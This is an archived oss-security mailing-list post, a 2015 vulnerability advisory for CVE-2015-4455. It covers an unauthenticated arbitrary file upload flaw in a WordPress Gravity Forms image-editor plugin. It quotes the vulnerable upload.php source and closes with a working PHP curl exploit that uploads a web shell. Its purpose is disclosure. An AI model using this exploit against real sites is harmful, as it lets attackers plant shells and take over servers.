X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4212" "Wednesday" "10" "June" "2015" "10:48:27" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<251ACF3F-8CEA-4A22-AB6E-35569598D2A0@me.com>" "103" "[oss-security] Remote file upload vulnerability in aviary-image-editor-add-on-for-gravity-forms v3.0beta Wordpress plugin" nil nil nil "6" "2015061014:48:27" "[oss-security] Remote file upload vulnerability in aviary-image-editor-add-on-for-gravity-forms v3.0beta Wordpress plugin" (number mark "        larry0@me.co Jun 10  103/4212  " thread-indent "\"[oss-security] Remote file upload vulnerability in aviary-image-editor-add-on-for-gravity-forms v3.0beta Wordpress plugin\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 9545 invoked by uid 550); 10 Jun 2015 14:49:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9398 invoked from network); 10 Jun 2015 14:48:48 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-06-10_10:2015-06-10,2015-06-10,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1506100243
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <251ACF3F-8CEA-4A22-AB6E-35569598D2A0@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Date: Wed, 10 Jun 2015 10:48:27 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Remote file upload vulnerability in
 aviary-image-editor-add-on-for-gravity-forms v3.0beta Wordpress plugin
To: Open Source Security <oss-security@lists.openwall.com>

Title: Remote file upload vulnerability in aviary-image-editor-add-on-for-g=
ravity-forms v3.0beta Wordpress plugin
Author: Larry W. Cashdollar, @_larry0
Date: 2015-06-07
Download Site: https://wordpress.org/plugins/aviary-image-editor-add-on-for=
-gravity-forms
Vendor: Waters Edge Web Design and NetherWorks LLC
Vendor Notified: 2015-06-08
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D125
Vendor Contact: plugins@wordpress.org
Description: A plugin that integrates the awesome Adobe Creative SDK (forme=
rly Aviary) Photo / Image Editor with the Gravity Forms Plugin.
Vulnerability:
There is a remote file upload vulnerability in aviary-image-editor-add-on-f=
or-gravity-forms/includes/upload.php as an unauthenticated user can upload =
any file to the system.  Including a .php file.  The upload.php doesn't che=
ck that the user is authenticated and a simple post will allow arbitrary co=
de to be uploaded to the server.

In the file aviary-image-editor-add-on-for-gravity-forms/includes/upload.ph=
p the code doesn=E2=80=99t check for an authenticated Wordpress user:

 1 <?php
 2=20
 3 $filename =3D $_SERVER["DOCUMENT_ROOT"]."/wp-load.php";
 4 if (file_exists($filename)) {
 5     include_once($filename);
 6 } else {
 7     include_once("../../../../wp-load.php");
 8 }
 9 echo "Here";
10 $image_file =3D $_FILES['gf_aviary_file'];
11 if($image_file['name']!=3D''){
12      $max_file_size =3D  4*1024*1024;
13      $file_size =3D intval($image_file['size']);
14      if( $file_size > $max_file_size ){
15          $msg =3D "File Size is too big.";
16          $error_flag =3D true;
17      }
18      $extension =3D strtolower(end(explode('.', $image_file['name'])));
19      $aa_options =3D get_option('gf_aa_options');
20      $supported_files =3D $aa_options['supported_file_format'];
21      $supported_files =3D strtolower($supported_files);
22      if(!$error_flag && $supported_files !=3D '' ){
23        $supported_files =3D explode (',', $supported_files);
24        if(!in_array($extension, $supported_files)){
25           $msg =3D "No Supported file.";
26           $error_flag =3D true;
27        }
28      }
29      if(!$error_flag){
30         $wp_upload_dir =3D wp_upload_dir();
31         if(!is_dir($wp_upload_dir['basedir'].'/gform_aviary')){
32              mkdir($wp_upload_dir['basedir'].'/gform_aviary');
33         }
34         $upload_dir =3D $wp_upload_dir['basedir'].'/gform_aviary/';
35         $upload_url =3D $wp_upload_dir['baseurl'].'/gform_aviary/';
36         $file_name =3D $upload_dir.$_POST['gf_aviary_field_id'].'_'.$ima=
ge_file['name'    ];
37         if(move_uploaded_file($image_file['tmp_name'], $file_name)){
38             $file_url =3D $upload_url.$_POST['gf_aviary_field_id'].'_'.$=
image_file['na    me'];
39         }
40     }
41     $return_obj =3D array('status' =3D> 'success', 'message' =3D> $file_=
url);
42     echo json_encode($return_obj);
43  }
44 ?>

CVEID: 2015-4455
OSVDB:
Exploit Code:
	=E2=80=A2 <?php
	=E2=80=A2 /*Remote shell upload exploit for aviary-image-editor-add-on-for=
-gravity-forms v3.0beta */
	=E2=80=A2 /*Larry W. Cashdollar @_larry0
	=E2=80=A2 6/7/2015
	=E2=80=A2 shell will be located http://www.vapidlabs.com/wp-content/upload=
s/gform_aviary/_shell.php
	=E2=80=A2 */
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2        $target_url =3D 'http://www.vapidlabs.com/wp-content/plug=
ins/aviary-image-editor-add-on-for-gravity-forms/includes/
	=E2=80=A2 upload.php';
	=E2=80=A2        $file_name_with_full_path =3D '/var/www/shell.php';
	=E2=80=A2=20=20
	=E2=80=A2        echo "POST to $target_url $file_name_with_full_path";
	=E2=80=A2        $post =3D array('name' =3D> 'shell.php','gf_aviary_file'=
=3D>'@'.$file_name_with_full_path);
	=E2=80=A2=20=20
	=E2=80=A2        $ch =3D curl_init();
	=E2=80=A2        curl_setopt($ch, CURLOPT_URL,$target_url);
	=E2=80=A2        curl_setopt($ch, CURLOPT_POST,1);
	=E2=80=A2        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	=E2=80=A2        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
	=E2=80=A2        $result=3Dcurl_exec ($ch);
	=E2=80=A2        curl_close ($ch);
	=E2=80=A2        echo "<hr>";
	=E2=80=A2        echo $result;
	=E2=80=A2        echo "<hr>";
	=E2=80=A2 ?>=
